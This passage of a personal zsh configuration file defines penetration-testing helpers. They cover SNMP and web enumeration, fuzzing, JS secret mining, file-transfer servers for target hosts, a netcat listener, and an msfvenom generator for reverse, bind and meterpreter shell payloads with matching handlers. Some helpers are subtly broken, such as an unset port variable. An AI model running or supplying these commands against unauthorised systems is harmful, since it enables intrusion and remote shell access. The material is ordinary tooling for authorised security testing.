            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $1_SNMPWALK.txt    
        else
            # Version 1 or 2c
            echo -e "\nSEARCHING VALID AUTH STRINGS\n"
            onesixtyone -p $2 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $1
            echo ""; read com_string\?"INPUT A VALID COMMUNITY STRING: "

            echo -e "\nDUMPING PARSED MIB TREE IN \"$1_SNMPCHECK.txt\"\n"
            snmp-check -v $snmp_ver -p $2 -d -c $com_string $1 > $1_SNMPCHECK.txt

            echo -e "\nDUMPING MIB STRINGS IN \"$1_SNMPWALK.txt\"\n"
            snmpwalk -r 2 -t 5 -v$snmp_ver -c $com_string $1:$2 | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $1_SNMPWALK.txt

            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $1_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $1_SNMPWALK.txt
        fi
    
    fi

}

#gcc compilation
gcc_comp() {
    gcc -Wall -I/home/damuna/gsl/include -c $1
}

gcc_ex(){
    gcc -L/home/damuna/gsl/lib $1 -O1 -g -lgmp -lm -lgsl -lgslcblas
}

# HTTP Tech Scanning function
techscan(){
        echo -e "------------TECHNOLOGY SCANNING \"$1\"----------------"
        host=$(echo $1 | unfurl format %d)
        port=$(echo $1 | unfurl format %P)

        echo -e "\nSERVER HEADER\n"
        curl -kIL $1

        echo -e "\nDEFAULT ALLOWED METHODS\n"
        curl -kILX OPTIONS $1

        if [[ $(echo $1 | unfurl format %s) == "https" ]]; then 
            if [[ -z $port ]]; then
                port=443
            fi
            echo -e "\nTESTING WITH SSLYZE / HEARTBLEED\n"
            sslyze $host:$port
            Heartbleed $1
        else
            if [[ -z $port ]]; then
                port=80
            fi
        fi

        echo -e "\nCHECKING IF VULNERABLE TO SHORT-SCANNING...\n"
        chk=$(sns -u $1 --check | grep -v "Target is not vulnerable")
        if [[ ! -z $chk ]]; then
            echo -e "TARGET IS VULNERABLE, DISCOVERING PATHS VIA SNS"
            sns -u $1 -s -t 25
        fi

        echo -e "\nFINGERPRINTING VIA HTTPX\n"
        echo $1 | httpx -random-agent -fr -mc 200 -silent -sc -server -title -cdn -cname

        echo -e "\nCHECKING WAF PRESENCE\n"
        wafme0w -t $1 --no-warning --concurrency 15

        echo -e "\nTECHNOLOGY SCANNING\n"
        whatweb -a 3 $1

        read -r pub\?"IS THE DOMAIN BEHIND CLOUDFLARE? (Y/N): "
        if [[ $pub =~ [Yy] ]]; then
            echo -e "\nCHECKING UNCOVERING & PUBLIC SUBDOMAINS\n"
            /home/damuna/TOOLS/CloakQuest3r/venv/bin/python3 /home/damuna/TOOLS/CloakQuest3r/cloakquest3r.py $host
        fi

        echo -e "\nNUCLEI HTTP SCANNING\n"
        nuclei -up &>/dev/null && nuclei -ut &>/dev/null
        nuclei -rl 15 -silent -t http/ -u $1

        echo -e "\nNIKTO & NMAP SCANNING\n"
        sudo nmap -Pn -sV --script="http-enum","http-vuln-*","http-webdav-*","http-tplink-*","http-svn-*","http-trace","http-shellshock","http-put","http-ntlm-*","http-methods","http-iis-*","http-git","http-drupal-*","http-errors","http-cors","http-config-*","http-comments-*","ssl-*","http-apache-*" -p$port $host
        nikto -h $host:$port -Tuning b
}

crawl(){
        local target=$1
        local cookie=${2:-"rand=rand"} 
        echo -e "------------------WEB CRAWLING----------------------\n"
        dom=$(echo $1 | unfurl format %d)

        echo -e "\nGATHERING ENDPOINTS\n"
        gospider --no-redirect --cookie "$cookie" -t 5 -s $1 --sitemap -d 3 --subs --js > /tmp/crawled_$dom.txt
        cat /tmp/crawled_$dom.txt | grep -E "\[href\]|\[url]" | grep -vE "\.css|\.js$|\.woff|\.woff2|\.ttf|\.png|\.jpg|\.jpeg|\.gif|\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -vif /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt

        echo -e "\nQUERY STRINGS\n"
        cat /tmp/crawled_$dom.txt | grep -E "\[href\]|\[url]" | grep -E "\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | qsreplace FUZZ | awk '!seen[$0]++'

        echo -e "\nFORM FIELDS\n"
        cat /tmp/crawled_$dom.txt | grep -E "form\]" | grep -vE "\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++'

        echo -e "\nSUBDOMAINS\n"
        cat /tmp/crawled_$dom.txt | grep -E "\[subdomains\]" | awk -F" " '{print $3}' | awk '!seen[$0]++'

        echo -e "\nJS FILES\n"
        cat /tmp/crawled_$dom.txt | grep -E "\[javascript\]" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' > /tmp/jstmp_$dom.txt
        while read line; do
            type=$(curl -s $line -I | grep -i Content-Type | awk -F" " '{print $2}' | head -n 1)
            if [[ $type =~ "javascript" ]]; then
                echo $line | anew -q /tmp/js_$dom.txt
            fi
        done < /tmp/jstmp_$dom.txt

        echo -e "\nEXTRACTING COMMENTS\n"
        ReconSpider.py $1 &>/dev/null
        cat results.json | jq '.comments[]'

        echo -e "\nEXTRACING E_MAILS\n"
        cat results.json | jq '.emails[]'

        echo -e "\nJS LINK MINING\n"
        cat /tmp/crawled_$dom.txt | grep -E "\[linkfinder\]" | awk -F" " '{print $6}' | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -v "www.w3.org" | grep -v "reactjs.org" | grep -v "mui.com"

        echo -e "\nJS SECRET MINING\n"
        cat /tmp/js_$dom.txt | while read line; do; /home/damuna/TOOLS/SecretFinder/venv/bin/python3 ~/TOOLS/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli | grep -v "twilio_" | grep -v "possible_" | grep -v "google_captcha"; done

        echo -e "\nBROKEN LINK 404 HIJACKING\n"
        blc -ro -f -i --filter-level 2 -g $1 | grep -i HTTP_404
}
# Extension Selector Function
select_extension() {
  local options=(
    [1]='.php,.inc,.txt,.html'
    [2]='.asp,.aspx,.ashx,.asmx'
    [3]='.jsp,.java,.class,.do,.action,.war'
    [4]='.cgi,.pl,.bat,.sh,.cmd'
    [5]='.log,.txt,.json,.xml,.html,.js,.pcap'
    [6]='.pem,.scr.,.der,.cert,.key,.crt,.pfx'
    [7]='.bak,.old,.tmp,.env,.wadl,.git'
    [8]='.zip,.tar,.tar.gz,.gz,.7z,.rar,.bz2,.gzip,.sqlite,.sql,.db,.kbdx'
    [9]='.vhd,.vmdk,.vhdx,.img,.iso'
    [10]='.doc,.docx,.xls,.xlsx,.pdf,.ppt,.odt,.ost'
    [11]='.exe,.dll,.jar,.apk'
  )

  print -P "%F{blue}Select file extension group:%f"
  for k v in "${(@kv)options}"; do
    print -P "%F{green}$k)%f $v"
  done

  local choice
  while true; do
    read -r "choice?Enter your choice [1-${#options}]: "
    case $choice in
      [1-5])
        ext=$options[$choice]
        print -P "%F{green}Selected:%f $ext"
        return 0
        ;;
      6)
        read -r "ext?Enter custom extensions (comma-separated): "
        print -P "%F{green}Custom set:%f $ext"
        return 0
        ;;
      *)
        print -P "%F{red}Invalid selection! Please try again.%f"
        ;;
    esac
  done
}


# File Discovery
filefuzz(){
    echo -e "-----------------FILE FUZZING------------------\n"
    dom=$(echo $1 | unfurl format %d)
    local target=$1
    local cookie=${2:-"rand=rand"}

    echo -e "\nSEARCHING RAFT FILES\n"
    ffuf -H "Cookie: $cookie" -s -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt | while read line; do echo $1/$line; done

    echo -e "\nSEARCHING GENERIC FILES\n"
    ffuf -H "Cookie: $cookie" -s -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w ~/WORDLISTS/common_content.txt | while read line; do echo $1/$line; done

    echo -e "\nNUCLEI FILE EXPOSURE\n"
    nuclei -up &>/dev/null && nuclei -ut &>/dev/null
    nuclei -rl 15 -silent -u $1 -t http/exposures -H "Cookie: $cookie"

    select_extension
    echo -e "\nPERFORMING EXTENSION FUZZING\n"
    urlgen $1
    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /tmp/endpoints_$dom.txt -e $ext | while read line; do echo $1/$line; done
    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt -e $ext | while read line; do echo $1/$line; done
}

# Directory Discovery
dirfuzz(){
    local target=$1
    local cookie=${2:-"rand=rand"}

    echo -e "-----------------DIRECTORY FUZZING------------------\n"
    echo -e "\nSEARCHING COMBINED DIRECTORIES\n"
    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,404,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt | while read line; do echo $1/$line/; done

    echo -e "\nSEARCHING COMBINED WORDS\n"
    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,404,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt | while read line; do echo $1/$line/; done
}

# TMUX Parallel Web Enumerator
webenum() {
  read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
  if [[ -z $cookie ]]; then
    cookie="rand=rand"
  fi
  dom=$(openssl rand -hex 12)
  tmux new-session -d -s $dom -n "$1" "source ~/.zshrc; techscan $1; read"
  tmux split-window -v -t $dom "source ~/.zshrc; crawl $1; read"
  tmux split-window -h -t $dom:0.0 "source ~/.zshrc; dirfuzz $1; read"
  tmux split-window -h -t $dom:0.1 "source ~/.zshrc; filefuzz $1; read"
  tmux select-layout -t $dom tiled
  tmux attach -t $dom
}



apifuzz(){
    echo -e "\nLAUNCHING KITERUNNER ON TARGET\n"
    kr scan $1/ -w ~/TOOLS/WORDLISTS/routes-large.kite
}

bckfile(){
    echo -e "\nSEARCHING BACKUPS OF FILE \"$1\"\n"
    bfac -u $1
}

# SSTI Scanner
tplscan(){
    python3 ~/tools/sstimap/sstimap.py --url $1 --forms
}

# Netcat Listener
listen(){
    sudo rlwrap -car nc -lvnp $1
}
smtpserv(){
    chnic
    echo -e "OPENING SMTP 'DebuggingServer' AT $ip:2525\n"
    python2 -m smtpd -n -c DebuggingServer $ip:2525
}

httpserv(){ 
    chnic
    echo -e "OPENING HTTP SERVER AT http://$ip:8888"
    python3 -m http.server 8888 >/dev/null
}

httpservUP(){
    # Get IP address (assuming chnic does this)
    chnic
    echo "File upload available at /upload"
    echo "curl -X POST https://$ip:443/upload -F 'files=@[FILE]' --insecure"
    
    # Clean up old files
    rm -f /tmp/server.{key,crt,pem}
    
    # Generate proper separate key and certificate files
    openssl req -x509 -newkey rsa:2048 -keyout /tmp/server.key -out /tmp/server.crt -days 365 -nodes -subj '/CN=server'
    
    # Combine them into a single PEM file as required by uploadserver
    cat /tmp/server.crt /tmp/server.key > /tmp/server.pem
    
    # Create upload directory
    mkdir -p /tmp/https && cd /tmp/https
    
    # Start the server
    python3 -m uploadserver 443 --server-certificate /tmp/server.pem
}

ftpserv(){
    chnic
    echo -e "OPENING FTP SERVER AT ftp://$ip:2121"
    python3 -m pyftpdlib -p 2121 -w >/dev/null
}

smbserv(){
    chnic
    read -r creds\?"INPUT \"USER:PASS\" CREDENTIALS (BLANK FOR ANONYMOUS): "
    usr=$(echo $creds | cut -d ":" -f1)
    psw=$(echo $creds | cut -d ":" -f2)
    if [[ ! -z $creds ]]; then
        echo -e "\nCONNECT WITH: net use n: \\\\\\$ip\\share /user:$usr $psw \nCOPY FILE: copy n:\\[FILE]\nEXECUTE FILE: n:\[FILE]"
        smbserver.py -ip $ip -user $usr -password $psw -smb2support share $(pwd)
    else
        echo -e "\nCONNECT WITH: copy \\\\\\$ip\\share\\[FILE]\n"
        smbserver.py -ip $ip -smb2support share $(pwd)
    fi

}

webdavserv(){
    chnic
    echo -e "\nOPENING WEBDAV AT http://$ip:8001\n FROM /tmp"
    wsgidav --host=$ip --port=8001 --root=$(pwd) --auth=anonymous
}
# Created by `pipx` on 2024-09-26 13:58:11
export PATH="$PATH:/home/damuna/.local/bin"

# Fuzzing of a GET parameter
paramfuzz(){
    nuclei -u $1 -headless -dast
}

ligcreate(){
    usr=$(whoami)
    sudo ip tuntap add user $usr mode tun $1
    sudo ip link set $1 up
    sudo ip route add $2 dev $1
}

# Password spraying
wordgen(){
    echo -e "\nGENERATING USERNAMES/PASSWORDS\n"
    cewl $1 -d 2 -m 4 --lowercase --with-numbers -w wordlist_custom.txt
}

# Alive Host IP/CIDR Scanning
alive(){
    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
    if [ -f ./$1 ]; then
        echo -e "\nNMAP SWEEPING\n"
        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping -iL $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt

    elif [[ $1 =~ $cidr_regex ]]; then
    	echo -e "\nFPING SWEEPING\n"
	    fping -asgq $1

        echo -e "\nNMAP SWEEPING\n"
        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt

        echo -e "\nNMAP TOP 100 TCP SWEEP\n"
        sudo nmap -n -Pn -g 53 -F --reason --disable-arp-ping $1
    else
        echo -e "\nNMAP PING SCANNING IP\n"
        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt && rm alive_ips.txt

        echo -e "\nNMAP TOP 100 TCP SWEEP\n"
        sudo nmap -n -Pn -g 53 -F --reason --disable-arp-ping $1
    fi
}



vhost(){
    # Getting root domain from URL
    host=$(echo $1 | unfurl format %d)

    echo -e "\n-------------------CHECKING HOST MISROUTING\n"
    vared -p "INPUT THE WORDLIST for vhosts (leave empty to use combined_subdomains): " -c wd
        if [[ -z $wd ]]; then
            wd="/usr/share/seclists/Discovery/DNS/combined_subdomains.txt"
        fi
    
    ffuf -mc all -ac -acs advanced -u $1 -c -w "$wd:FUZZ" -H "Host: FUZZ.$host" "${@:2}"
}


listenping(){
    sudo tcpdump -i tun0 icmp
}

# WINDAPSEARCH
alias windapsearch='/home/damuna/TOOLS/windapsearch/venv/bin/python3 /home/damuna/TOOLS/windapsearch/windapsearch.py'

# web shell path
webshell(){
    cd '/usr/share/laudanum/'
}

# Check ANY record
dnsrec(){
    if [[ -z "$1" ]]; then
        echo "Usage: dnsrec <domain> <ip>"
        return 1
    fi

    local record_types=(A AAAA CNAME MX NS SOA TXT)

    for record in "${record_types[@]}"; do
        echo "\n\------------------------ $record Record --------------------------\n"
        dig $record $1 @$2
    done
}

# Ligolo proxy
ligstart(){
    mkdir ./LIGOLO_DATA && cd ./LIGOLO_DATA
    sudo ligolo-proxy -selfcert
}

# Default credentials for services / applications
searchpass(){
    sudo pass-station search $1
}

# MSF Listener / Binder Generator
# MSF Listener / Binder Generator
metash(){
    chnic
    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ ^lin* ]]; then
        read -r form\?"SELECT FORMAT (elf, elf-so): "
    fi
    if [[ $os =~ ^win* ]]; then
        read -r form\?"SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
    fi

    ext_form=$form
    if [[ $form == "ps1" ]]; then
        form="psh"
        ext_form="ps1"
    fi

    read -r type\?"SELECT STAGING: (staged / stageless): "
    if [[ $type == "stageless" ]]; then
        read -r lis\?"SELECT CONNECTION (bind / reverse): "
    fi

    if [[ $type == "staged" ]]; then
        read -r lis\?"SELECT CONNECTION (bind / reverse / meterpreter): "
    fi

    read -r lhost\?"INPUT PAYLOAD IP/NIC: "
    read -r port\?"INPUT PAYLOAD PORT: "

    if [[ $os =~ ^lin* ]]; then
        if [[ $os == "lin32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi

            if [[ $type == "stageless" ]]; then 
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "lin64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
    fi

    if [[ $os =~ ^win* ]]; then
        if [[ $os == "win64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "win32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
    fi
}

# Interface Setting
chnic(){
    nic_lst=$(ifconfig | awk -F" " '{print $1}' | grep : | tr -d ':' | tr '\n' ', ')
    read -r nic\?"SELECT NIC (${nic_lst%?}): "
    export inter=$nic
    export ip=$(ifconfig $inter 2>/dev/null | awk -F" " '{print $2}' | sed -n '2 p')
}

alias copyfile='xclip -sel clip'

# GET/POST/Header discovery
paramscan(){
    vared -p "INPUT THE WORDLIST for vhosts (leave empty to use burp-parameter): " -c wd
        if [[ -z $wd ]]; then
            wd=/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
        fi

    echo "\nX8 SEARCH (GET/POST)\n"    
    x8 -u $1 -X GET POST -w $wd

    echo -e "\nX8 SEARCH (JSON)\n"
    x8 -u $1 -X POST -w $wd -t json
}

# Usernames Generation
usergen(){
    echo -e "\nGENERATING USERNAMES\n"
    ~/TOOLS/username-anarchy/username-anarchy -i $1 > gen_users.txt
}

# Neo4j server
neostart(){
    sudo neo4j console
}

# Add/Extend Host Mappings of /etc/hosts
addhost() {
    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}


# AD Realm Setting Function
krbconf(){
    genhosts $1

    echo -e "\nCHECKING DC IP\n"
    dc_ip=$(sudo nmap -p88 $1 -n -Pn --disable-arp-ping -g 53 -T4 --open -oG - | awk '/88\/open/ {print $2}')
    if [[ -z $dc_ip ]]; then
        echo -e "DC NOT FOUND, SKIPPING REALM CONFIGURATION"
        return 1
    fi

    if [[ $(echo $dc_ip | wc -l) != "1" ]]; then
        echo -e "\nFOUND MULTIPLE DCs: \n"
        echo $dc_ip | while read ip; do nxc smb $ip; done
        read -r dc_ip\?"INPUT DC IP TO CONFIGURE DOMAIN: "
    fi

    echo -e "\nSYNCING TIME WITH DC \"$dc_ip\"\n"
    sudo timedatectl set-ntp off
    timeout 1 sudo ntpdate -s $dc_ip
    timeout 1 sudo rdate -n $dc_ip

    echo -e "\nADDING AD REALM FOR \"$dc_ip\"\n"
    nxc smb $dc_ip --generate-krb5-file /tmp/krb5conf
    if [[ ! -f /tmp/krb5conf ]]; then
        echo -e "\nKB GENERATION FAILED, TRY AGAIN OR CHANGE DC\n"
            return 1
    fi

    dom=$(cat /tmp/krb5conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
    domchk=$(cat /etc/resolv.conf | grep "domain $dom")
    echo -e "\nADDING NS CONFIGURTATION FOR \"$dc_ip\" ON DOMAIN \"$dom\"\n"

    if [[ -z $domchk ]]; then
        echo "\n#---AD GENERATED---#\ndomain $dom\nnameserver $dc_ip\n" | sudo tee --append /etc/resolv.conf
    fi
    if [[ -f /etc/krb5.conf ]]; then
        prev_dom=$(cat /etc/krb5.conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
        if [[ ! -z $prev_dom ]]; then
            def_rlm=$(cat /tmp/krb5conf | grep -i default_realm | tr -d ' ')
            sudo sed -i -e "s/    default_realm = $prev_dom/    $def_rlm/g" /etc/krb5.conf
            sudo sed -i -e "s/    default_realm=$prev_dom/    $def_rlm/g" /etc/krb5.conf
            cat /tmp/krb5conf | tail -n 2 | while read line; do grep -qxF "    $line" /etc/krb5.conf || echo "    $line" | sudo tee --append /etc/krb5.conf; done
            rlm=$(cat /tmp/krb5conf | grep kdc | tail -n 1 | awk -F"=" '{print $2}')
            blk=$(cat /tmp/krb5conf | grep -i { -A4)
            rlm_chk=$(cat /etc/krb5.conf | grep -i $rlm)
            if [[ -z $rlm_chk ]]; then
                sudo awk -v text="$blk" '/\[realms\]/ {print; print "" text; next} 1' /etc/krb5.conf > tmp && sudo mv tmp /etc/krb5.conf
            fi
        else
            sudo mv /tmp/krb5conf /etc/krb5.conf
        fi
    else
